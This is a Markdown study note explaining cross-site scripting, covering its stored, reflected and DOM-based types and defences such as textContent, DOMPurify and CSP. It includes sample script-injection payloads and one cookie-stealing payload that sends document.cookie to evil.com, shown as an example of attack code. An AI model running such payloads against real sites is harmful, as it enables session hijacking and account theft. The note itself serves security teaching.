
# 🕵️‍♂️ XSS (Cross-Site Scripting) — “When Your Website Betrays You”

> **Definition:**  
> XSS (Cross-Site Scripting) is a vulnerability where **untrusted user input is treated as executable JavaScript instead of plain data**, allowing attackers to run code inside another user’s browser.



## 🎭 The Illusion — “It’s Just Text… Right?”

Web apps often take user input and display it:

```js
container.innerHTML = userInput;
```

Looks harmless.

But the **browser** doesn’t think like you.

👉 It **parses** (interprets) the string as HTML  
👉 If it sees `<script>`, it runs it

---

## 💣 The Attack — **“Surprise, It’s Code”

### Malicious input:

```html
<script>alert("Hacked")</script>
```
### What happens:

- Browser reads it as **JavaScript**
- Executes immediately
    
👉 The attacker just ran code inside your app

---

## 🧨 Real Payload — “Not Just Annoying Alerts”

Attackers don’t care about alerts. They want **control**!
```html
<script>
fetch("https://evil.com/steal?cookie=" + document.cookie);
</script>
```
[[document.cookie]]
### What this does:

- Grabs session cookies
    
- Sends them to attacker
    
- Attacker can impersonate the user
    

👉 This is how accounts get hijacked

---

## 🧠 Why It Works — “You Trusted the Wrong Thing”

The root problem:

> ❌ Treating user input as **code**  
> ✅ Instead of treating it as **data**

---

## 🧩 The 3 Main Types of XSS

---

### 1. 🔁 Stored XSS — “The Time Bomb”

> Malicious script is **saved** (database, comments, profiles)

**Example:**

- User posts a comment:
    

```html
<script>stealCookies()</script>
```

- Every visitor who views the comment:  
    💥 gets attacked
    

👉 Persistent, spreads automatically

---

### 2. ⚡ Reflected XSS — “The Mirror Attack”

> Script comes from the **URL or request** and is immediately reflected

**Example URL:**

```
https://site.com/search?q=<script>alert(1)</script>
```

If the site does:

```js
results.innerHTML = query;
```

👉 Script executes instantly

---

### 3. 🧠 DOM-Based XSS — “Client-Side Betrayal”

> Vulnerability exists **purely in JavaScript**

**Example:**

```js
let input = location.hash;
output.innerHTML = input;
```

URL:

```
site.com/#<script>alert(1)</script>
```

👉 No server involved — browser executes it

---

## 🛡️ Defense Mode — “Lock the Doors”

---

### ✅ 1. Use `textContent` instead of `innerHTML`

```js
element.textContent = userInput;
```

✔ Displays text  
❌ Does NOT execute code

---

### ✅ 2. Sanitize Input (Clean It)

Remove dangerous tags like:

- `<script>`
    
- `onerror`
    
- `onclick`
    

Use libraries like:

- DOMPurify (industry standard)
    

---

### ✅ 3. Avoid Inline JavaScript

❌ Bad:

```html
<button onclick="doSomething()">
```

✔ Good:

```js
button.addEventListener("click", doSomething);
```

---

### ✅ 4. Content Security Policy (CSP)

> Browser-level protection that blocks unsafe scripts

Example:

```http
Content-Security-Policy: script-src 'self'
```

---

## 🔥 Mental Model — “Who Controls the Browser?”

|Scenario|Who Runs Code?|
|---|---|
|Normal app|You (developer)|
|XSS attack|Attacker|

---

## ⚔️ XSS vs SQL Injection (Don’t Mix These Up)

|Feature|XSS|SQL Injection|
|---|---|---|
|Target|Browser|Database|
|Language|JavaScript|SQL|
|Location|Frontend|Backend|

---

## 🧠 The Golden Rule (Tattoo This)

> 🚨 **Never trust user input — ever.**

If it comes from:

- forms
    
- URLs
    
- APIs
    
- users
    

👉 Treat it as hostile

---

## 🧪 Quick Self-Test

### What’s wrong here?

```js
profile.innerHTML = userBio;
```

✔ Answer:

- Vulnerable to XSS
    
- User can inject `<script>`
    
- Browser will execute it
    

---

## 🚀 Final Takeaway — “Power and Responsibility”

XSS is:

- One of the **most common web vulnerabilities**
    
- One of the **first things pentesters look for**
    
- One of the **easiest mistakes developers make**
    

Master this and you’re already thinking like:

> 🧠 a developer  
> ⚔️ and an attacker

---

## 🔗 Related Notes

- [[DOM and Nodes]]
    
- [[innerHTML vs textContent]]
    
- [[Client-Side Security]]
    
- [[Input Validation vs Output Encoding]]
    

```

If you want next level: I can turn one of your current projects into a **deliberately vulnerable lab** so you can *exploit it yourself* like a real pentester.
```